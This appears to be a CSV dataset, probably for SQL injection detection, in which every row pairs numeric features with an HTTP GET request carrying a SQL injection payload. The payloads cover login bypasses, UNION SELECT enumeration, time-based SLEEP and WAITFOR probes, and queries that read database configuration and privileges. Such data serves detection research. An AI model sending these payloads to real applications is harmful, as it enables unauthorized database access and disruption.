35,1,200,6679,14,5,5,1,1,GET ?phone= ORDER BY 16--  HTTP/1.1
35,1,200,1441,14,5,5,1,1,GET ?phone= ORDER BY 16--  HTTP/1.1
45,2,200,2858,7,16,11,1,1,GET ?username='^'&pass=") or ("a"="a HTTP/1.1
50,1,200,2562,13,5,7,1,1,GET ?phone= AND 7506=9091 AND ('5913=5913 HTTP/1.1
40,1,200,5813,19,7,5,2,1,GET login/?id=ORDER BY SLEEP(5) HTTP/1.1
40,1,200,3127,19,7,5,2,1,GET login/?id=ORDER BY SLEEP(5) HTTP/1.1
40,1,200,7977,19,7,5,2,1,GET login/?id=ORDER BY SLEEP(5) HTTP/1.1
40,1,200,3457,19,7,5,2,1,GET login/?id=ORDER BY SLEEP(5) HTTP/1.1
40,1,200,2917,19,7,5,2,1,GET login/?id=ORDER BY SLEEP(5) HTTP/1.1
40,1,200,4806,19,7,5,2,1,GET login/?id=ORDER BY SLEEP(5) HTTP/1.1
40,1,200,1554,19,7,5,2,1,GET login/?id=ORDER BY SLEEP(5) HTTP/1.1
32,1,200,5147,7,12,6,1,1,GET ?account=' and a='a HTTP/1.1
32,1,200,1652,7,12,6,1,1,GET ?account=' and a='a HTTP/1.1
32,1,200,4940,7,12,6,1,1,GET ?account=' and a='a HTTP/1.1
32,1,200,3896,7,12,6,1,1,GET ?account=' and a='a HTTP/1.1
32,1,200,3408,7,12,6,1,1,GET ?account=' and a='a HTTP/1.1
263,2,200,4878,109,4,40,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
75,2,200,6372,23,18,10,1,1,GET ?phone=or benchmark(50000000_MD5(1))&id= UNION ALL SELECT 1_2# HTTP/1.1
218,2,200,7966,98,8,45,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))-- &pass=' HTTP/1.1
110,2,200,4594,21,9,8,2,1,GET ?name=" or "1"="1"/*&tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
66,1,200,6497,21,4,3,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
66,1,200,5174,21,4,3,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
66,1,200,6432,21,4,3,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
66,1,200,7780,21,4,3,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
351,2,200,4488,162,12,66,1,1,GET ?username= AND 5650=CONVERT(INT_(SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) (SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))--  HTTP/1.1
62,1,200,1891,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,7968,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
157,2,200,5809,46,13,21,1,1,GET ?account=' or 1=1#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23# HTTP/1.1
68,2,200,5552,31,7,9,1,1,GET ?tel= AS INJECTX WHERE 1=1 AND 1=1--&name= ORDER BY 23  HTTP/1.1
68,2,200,5260,31,7,9,1,1,GET ?tel= AS INJECTX WHERE 1=1 AND 1=1--&name= ORDER BY 23  HTTP/1.1
68,2,200,5258,7,32,17,1,1,GET ?email=_(select * from (select(sleep(10)))a)&phone=' -- HTTP/1.1
46,1,200,1579,19,8,7,1,1,GET ?username= ORDER BY 1_SLEEP(5)--  HTTP/1.1
46,1,200,4611,19,8,7,1,1,GET ?username= ORDER BY 1_SLEEP(5)--  HTTP/1.1
46,1,200,2141,19,8,7,1,1,GET ?username= ORDER BY 1_SLEEP(5)--  HTTP/1.1
46,1,200,7780,19,8,7,1,1,GET ?username= ORDER BY 1_SLEEP(5)--  HTTP/1.1
100,2,200,1954,21,14,8,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19&phone=sleep(5)# HTTP/1.1
109,2,200,7871,23,13,10,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20-- &pass= OR x=x--  HTTP/1.1
45,2,200,5590,7,18,8,1,1,GET ?id=admin" or 1=1#&pass=admin" # HTTP/1.1
100,2,200,6075,46,7,20,1,1,GET ?tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7#&name=== HTTP/1.1
118,2,200,6558,31,30,8,1,1,GET ?username= ORDER BY 17-- &pass=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
106,2,200,1580,43,16,18,1,1,GET ?username=';WAITFOR DELAY '0:0:30'--&pass=IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- HTTP/1.1
66,1,200,5268,34,8,14,1,1,GET ?account=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- HTTP/1.1
66,1,200,2685,34,8,14,1,1,GET ?account=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- HTTP/1.1
66,1,200,1378,34,8,14,1,1,GET ?account=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- HTTP/1.1
66,1,200,2843,34,8,14,1,1,GET ?account=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- HTTP/1.1
66,1,200,5105,34,8,14,1,1,GET ?account=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- HTTP/1.1
213,2,200,4231,136,7,21,1,1,GET ?tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &name= ORDER BY 17--  HTTP/1.1
131,2,200,4230,43,8,25,1,1,GET ?code=' AND MID(VERSION()_1_1) = '5';&code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
56,2,200,6156,14,16,11,1,1,GET ?name= ORDER BY 28 &phone=admin') or '1'='1 HTTP/1.1
128,2,200,4177,30,9,16,1,1,GET ?phone=or 1=1&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
183,2,200,5486,45,8,15,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23-- &code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15 HTTP/1.1
54,2,200,1011,21,9,7,1,1,GET ?email= ORDER BY 13# &pass= ORDER BY 23#  HTTP/1.1
72,1,200,2342,21,4,5,1,1,GET ?pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
72,1,200,6470,21,4,5,1,1,GET ?pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
72,1,200,6887,21,4,5,1,1,GET ?pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
72,1,200,7161,21,4,5,1,1,GET ?pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
163,2,200,3217,31,14,21,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29#&name=admin') or ('1'='1 HTTP/1.1
59,2,200,1807,19,16,12,1,1,GET ?id=ORDER BY SLEEP(5)--&pass=' or user like '% HTTP/1.1
34,1,200,4106,14,5,4,1,1,GET ?email= ORDER BY 25#  HTTP/1.1
34,1,200,5311,14,5,4,1,1,GET ?email= ORDER BY 25#  HTTP/1.1
34,1,200,2503,14,5,4,1,1,GET ?email= ORDER BY 25#  HTTP/1.1
34,1,200,2893,14,5,4,1,1,GET ?email= ORDER BY 25#  HTTP/1.1
34,1,200,3159,14,5,4,1,1,GET ?email= ORDER BY 25#  HTTP/1.1
34,1,200,7737,14,5,4,1,1,GET ?email= ORDER BY 25#  HTTP/1.1
34,1,200,2861,14,5,4,1,1,GET ?email= ORDER BY 25#  HTTP/1.1
54,2,200,1505,21,7,9,1,1,GET ?phone= ORDER BY 16-- &id= ORDER BY 14--  HTTP/1.1
57,2,200,4193,7,18,21,1,1,GET ?name=') or ('x'='x&tel=admin') or '1'='1'-- HTTP/1.1
44,2,200,1575,14,10,7,1,1,GET ?email=1*56&phone= ORDER BY 2#  HTTP/1.1
155,2,200,5068,78,16,31,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5#&pass=AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe HTTP/1.1
35,1,200,7268,14,4,3,1,1,GET ?code= ORDER BY 31337  HTTP/1.1
35,1,200,5866,14,4,3,1,1,GET ?code= ORDER BY 31337  HTTP/1.1
35,1,200,2237,14,4,3,1,1,GET ?code= ORDER BY 31337  HTTP/1.1
65,2,200,6914,26,11,10,1,1,GET ?account= ORDER BY 1_SLEEP(5)-- &pass= ORDER BY 28#  HTTP/1.1
36,1,200,6977,7,11,6,2,1,GET login/?id=") or ("a"="a HTTP/1.1
36,1,200,6437,7,11,6,2,1,GET login/?id=") or ("a"="a HTTP/1.1
66,1,200,4531,30,7,15,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3--  HTTP/1.1
66,1,200,3772,30,7,15,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3--  HTTP/1.1
66,1,200,3605,30,7,15,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3--  HTTP/1.1
207,2,200,6057,45,8,15,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
106,2,200,5339,27,12,9,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18-- &pass= HAVING 1=0# HTTP/1.1
183,2,200,3452,59,12,31,1,1,GET ?email=AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25--  HTTP/1.1
81,2,200,6238,30,6,21,2,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3-- &id=") or ("1"="1"/* HTTP/1.1
94,2,200,1546,49,9,16,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_"'3'"#&pass= UNION ALL SELECT SLEEP(5)--  HTTP/1.1
89,1,200,6133,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
89,1,200,1654,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
89,1,200,3861,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
89,1,200,3469,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
89,1,200,2090,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
89,1,200,2952,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
256,2,200,6836,133,12,29,1,1,GET ?username= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
103,2,200,1298,46,8,19,1,1,GET ?id=or 1=1#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7 HTTP/1.1
85,2,200,1429,44,7,15,1,1,GET ?phone= ORDER BY 17-- &id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)--  HTTP/1.1
133,2,200,2718,21,14,8,1,1,GET ?name=admin' or 1=1#&tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29 HTTP/1.1
47,2,200,1638,14,7,9,1,1,GET ?name="*"&tel=1' GROUP BY 1_2_3--  HTTP/1.1
214,2,200,4140,109,7,41,1,1,GET ?tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))#&name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88)))# HTTP/1.1
179,2,200,1496,97,14,23,2,1,GET ?username= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass=") or ("1"="1"/* HTTP/1.1
120,2,200,5184,53,13,21,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL-- &id=admin"or 1=1 or ""=" HTTP/1.1
110,1,200,1798,30,8,14,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
110,1,200,4967,30,8,14,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
110,1,200,6475,30,8,14,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
110,1,200,6244,30,8,14,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
110,1,200,1920,30,8,14,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
110,1,200,5365,30,8,14,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
83,2,200,6556,7,44,15,1,1,GET ?id=select current_setting('virtual_host');&pass=admin") or ("1"="1"-- HTTP/1.1
155,2,200,3091,31,12,15,1,1,GET ?tel=1-false&name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
202,1,200,7438,94,7,39,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))# HTTP/1.1
202,1,200,4022,94,7,39,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))# HTTP/1.1
61,2,200,5121,7,23,18,1,1,GET ?phone=' or 'x'='x&id=");waitfor delay '0:0:5'-- HTTP/1.1
86,2,200,6039,30,10,18,1,1,GET ?mail= or 0=0 --&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
56,2,200,7043,21,10,8,1,1,GET ?email= ORDER BY 27-- &phone= ORDER BY 16#  HTTP/1.1
179,2,200,5430,45,7,17,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10-- &name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26--  HTTP/1.1
126,1,200,3180,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
126,1,200,5321,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
126,1,200,5487,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
126,1,200,1347,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
126,1,200,4332,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
150,2,200,2122,60,7,19,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13#&name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9# HTTP/1.1
27,1,200,6875,7,10,3,1,1,GET ?pass= or true HTTP/1.1
27,1,200,3711,7,10,3,1,1,GET ?pass= or true HTTP/1.1
27,1,200,5715,7,10,3,1,1,GET ?pass= or true HTTP/1.1
142,2,200,6302,38,9,15,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23#&pass= ORDER BY 3#  HTTP/1.1
150,2,200,5563,35,9,5,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
46,1,200,1771,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
46,1,200,1305,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
46,1,200,3662,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
46,1,200,2307,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
46,1,200,1442,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
46,1,200,4472,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
46,1,200,4795,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
116,2,200,2643,33,6,15,1,1,GET ?id= OR x=y#&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18 HTTP/1.1
104,2,200,3849,45,9,14,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4&phone= UNION ALL SELECT 1_2_3_4_5# HTTP/1.1
75,2,200,2152,7,37,15,1,1,GET ?name= or 1=1&phone= and (select substring(@@version_2_1))='y' HTTP/1.1
59,2,200,4305,7,23,13,1,1,GET ?name=;waitfor delay '0:0:5'--&phone=" or ""^" HTTP/1.1
162,2,200,2795,46,15,20,1,1,GET ?mail=admin" or 1=1--&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
67,2,200,4038,9,20,14,1,1,GET ?tel=" or 1=1--&name=") or benchmark(10000000_MD5(1))# HTTP/1.1
59,2,200,1918,21,8,10,1,1,GET ?id=' or 'x'='x&id= UNION ALL SELECT 1_2_3_4_5 HTTP/1.1
73,2,200,2558,14,35,11,1,1,GET ?mail= ORDER BY 7# &pass=select current_setting('hba_file'); HTTP/1.1
70,2,200,4523,17,16,12,2,1,GET ?id=waitfor delay '00:00:05'#&id=RANDOMBLOB(1000000000/2) HTTP/1.1
176,2,200,7647,54,7,25,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13-- &tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
172,2,200,3560,81,6,33,1,1,GET ?id= ORDER BY 21# &pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))--  HTTP/1.1
86,1,200,7992,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
86,1,200,6876,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
86,1,200,1211,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
86,1,200,2935,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
86,1,200,5168,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
99,2,200,6130,31,16,20,1,1,GET ?email=') or sleep(5)='&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7# HTTP/1.1
193,2,200,3255,91,6,38,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116)))&id=' AnD SLEEP(5) ANd '1 HTTP/1.1
108,2,200,1093,21,6,7,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23#&id=" or ""*" HTTP/1.1
63,1,200,2911,7,40,8,1,1,GET ?account=select current_setting('data_directory'); HTTP/1.1
63,1,200,2081,7,40,8,1,1,GET ?account=select current_setting('data_directory'); HTTP/1.1
161,2,200,4394,73,9,32,1,1,GET ?name= AND 1=0-- &phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))# HTTP/1.1
127,2,200,7207,28,7,7,1,1,GET ?phone= ORDER BY 31337#&id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26# HTTP/1.1
127,2,200,5677,30,36,18,1,1,GET ?phone=select grantee from syscat.dbauth;&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
56,2,200,1222,7,18,15,1,1,GET ?tel=) or '1′='1–&name=admin'or 1=1 or ''=' HTTP/1.1
145,2,200,1067,31,11,14,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26&pass=" or 1=1 HTTP/1.1
48,2,200,3845,7,17,15,2,1,GET ?mail=') or ('x')=('x&pass=admin"/* HTTP/1.1
136,2,200,5694,31,40,15,1,1,GET ?id=select system_user from sysibm.sysdummy1;&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
123,2,200,2334,61,9,21,1,1,GET ?tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL-- &name=" or 0=0 # HTTP/1.1
93,1,200,6989,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,5479,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,2959,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,2002,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,4298,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,7964,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
